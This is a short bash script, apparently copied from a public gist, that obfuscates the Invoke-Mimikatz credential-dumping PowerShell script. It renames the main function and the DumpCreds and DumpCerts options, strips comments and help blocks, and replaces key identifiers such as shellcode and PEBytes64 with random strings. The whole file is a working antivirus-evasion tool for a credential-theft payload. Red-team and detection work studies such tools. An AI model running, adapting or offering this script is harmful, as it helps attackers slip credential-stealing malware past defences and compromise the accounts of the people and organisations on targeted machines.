#!/bin/bash

# Original: https://gist.githubusercontent.com/infosecn1nja/bb0771adb879f1690a0dd8dfa0fc728b/raw/70d45ad3ac382554d897f1d7b3673452fa7a6dfb/obfuscate-mimikatz.sh

if [[ -z $1 ]]; then
    echo './obfuscate-Invoke-Mimikatz.sh Invoke-Mimikatz.ps1 Invoke-Minidoggiez.ps1'
    exit 1
fi


randstr(){< /dev/urandom tr -dc a-zA-Z0-9 | head -c${1:-8};}

cp $1 $2
sed -i -e "s/Invoke-Mimikatz/Invoke-Minidoggiez/g" $2
sed -i -e '/<#/,/#>/c\\' $2
sed -i -e "s/^[[:space:]]*#.*$//g" $2
sed -i -e "s/DumpCreds/PullLove/g" $2
sed -i -e "s/DumpCerts/PullUniverse/g" $2
sed -i -e "s/CustomCommand/CustomizedThing/g" $2
sed -i -e "s/TypeBuilder/$(randstr)/g" $2
sed -i -e "s/Win32Types/$(randstr)/g" $2
sed -i -e "s/Win32Functions/$(randstr)/g" $2
sed -i -e "s/shellcode/$(randstr)/g" $2
sed -i -e "s/PEBytes64/$(randstr)/g" $2
sed -i -e "s/PEBytes32/$(randstr)/g" $2
sed -i -e "s/ArgumentPtr/$(randstr)/g" $2
sed -i -e "s/CallDllMainSC1/$(randstr)/g" $2
